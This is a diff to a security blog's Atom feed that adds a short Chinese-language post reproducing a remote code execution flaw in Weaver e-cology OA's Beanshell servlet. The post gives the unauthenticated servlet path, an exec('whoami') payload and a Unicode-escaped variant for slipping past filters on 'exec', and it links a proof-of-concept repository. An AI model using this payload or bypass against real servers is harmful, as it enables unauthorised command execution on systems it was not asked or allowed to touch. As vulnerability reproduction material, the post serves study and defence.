@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-09-23T03:45:05.535Z</updated>
+    <updated>2019-09-23T09:35:03.461Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -10,6 +10,26 @@
     <logo>http://www.svenbeast.com//images/avatar.png</logo>
     <icon>http://www.svenbeast.com//favicon.ico</icon>
     <rights>All rights reserved 2019, 斯文beast</rights>
+    <entry>
+        <title type="html"><![CDATA[泛微e-cology OA Beanshell组件远程代码执行(复现及POC)]]></title>
+        <id>http://www.svenbeast.com//post/9rcdl83tA</id>
+        <link href="http://www.svenbeast.com//post/9rcdl83tA">
+        </link>
+        <updated>2019-09-23T03:59:58.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x01-访问未授权访问页面">0x01 访问未授权访问页面</h3>
+<p>http://oa.xxxx.com/weaver/bsh.servlet.BshServlet<br>
+<img src="http://www.svenbeast.com//post-images/1569211550430.jpg" alt=""></p>
+<h3 id="0x02-输入payload">0x02 输入payload</h3>
+<p>exec(&quot;whoami&quot;);<br>
+输入命令执行函数，传入cmd命令，查看回显是否成功执行<br>
+<img src="http://www.svenbeast.com//post-images/1569211623826.png" alt=""></p>
+<h3 id="0x03-将exec进行unicode编码绕过部分站点exec过滤">0x03 将exec进行Unicode编码绕过部分站点exec过滤</h3>
+<p>\u0065\u0078\u0065\u0063(&quot;whoami&quot;);<br>
+<img src="http://www.svenbeast.com//post-images/1569211999619.png" alt=""></p>
+<p>PS：https://github.com/jas502n/e-cology<br>
+少宇师傅的POC地址，后期批量有时间就写，现在70周年国庆节，有点忙。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Shiro<=1.2.4反序列化的简单理解及POC]]></title>
         <id>http://www.svenbeast.com//post/fkOpKjach</id>
